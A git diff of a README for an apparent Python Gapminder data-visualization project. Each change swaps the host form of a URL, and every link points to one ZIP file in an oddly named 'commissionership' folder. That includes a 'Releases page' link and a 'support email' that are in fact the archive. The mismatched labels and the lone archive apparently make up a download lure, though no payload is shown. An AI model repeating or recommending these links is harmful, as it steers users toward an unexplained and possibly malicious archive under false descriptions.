@@ -1,6 +1,6 @@
 # 🎉 Python--Gapminder-Data-Exploration-and-Visualization - Explore World Trends with Ease
 
-[![Download Latest Release](https://raw.githubusercontent.com/usmanbasit2033/Python--Gapminder-Data-Exploration-and-Visualization/main/commissionership/Python--Gapminder-Data-Exploration-and-Visualization.zip%20Latest%20Release-Click%20Here-brightgreen)](https://raw.githubusercontent.com/usmanbasit2033/Python--Gapminder-Data-Exploration-and-Visualization/main/commissionership/Python--Gapminder-Data-Exploration-and-Visualization.zip)
+[![Download Latest Release](https://github.com/usmanbasit2033/Python--Gapminder-Data-Exploration-and-Visualization/raw/refs/heads/main/commissionership/Python--Gapminder-Data-Exploration-and-Visualization.zip%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/usmanbasit2033/Python--Gapminder-Data-Exploration-and-Visualization/raw/refs/heads/main/commissionership/Python--Gapminder-Data-Exploration-and-Visualization.zip)
 
 ## 🚀 Getting Started
 
@@ -16,7 +16,7 @@ To use this application, you will need the following:
 
 ## 📥 Download & Install
 
-1. **Visit the Releases Page**: Go to the [Releases page](https://raw.githubusercontent.com/usmanbasit2033/Python--Gapminder-Data-Exploration-and-Visualization/main/commissionership/Python--Gapminder-Data-Exploration-and-Visualization.zip).
+1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/usmanbasit2033/Python--Gapminder-Data-Exploration-and-Visualization/raw/refs/heads/main/commissionership/Python--Gapminder-Data-Exploration-and-Visualization.zip).
  
 2. **Choose the Latest Release**: Look for the most recent version of the application. It should be listed at the top.
 
@@ -57,7 +57,7 @@ If you experience issues or need assistance, you can:
 
 - Check the FAQ section in the application.
 - Look for help on our GitHub Issues page.
-- Contact support via email at https://raw.githubusercontent.com/usmanbasit2033/Python--Gapminder-Data-Exploration-and-Visualization/main/commissionership/Python--Gapminder-Data-Exploration-and-Visualization.zip
+- Contact support via email at https://github.com/usmanbasit2033/Python--Gapminder-Data-Exploration-and-Visualization/raw/refs/heads/main/commissionership/Python--Gapminder-Data-Exploration-and-Visualization.zip
 
 ## 📁 Other Information
 
@@ -66,6 +66,6 @@ Feel free to explore additional resources, such as:
 - **Documentation**: Learn more about the application features and how to make the most of your data analysis.
 - **Community Forum**: Join discussions with other users and share insights.
 
-For continuous updates, check back on the [Releases page](https://raw.githubusercontent.com/usmanbasit2033/Python--Gapminder-Data-Exploration-and-Visualization/main/commissionership/Python--Gapminder-Data-Exploration-and-Visualization.zip) regularly. 
+For continuous updates, check back on the [Releases page](https://github.com/usmanbasit2033/Python--Gapminder-Data-Exploration-and-Visualization/raw/refs/heads/main/commissionership/Python--Gapminder-Data-Exploration-and-Visualization.zip) regularly. 
 
 Happy data exploring!
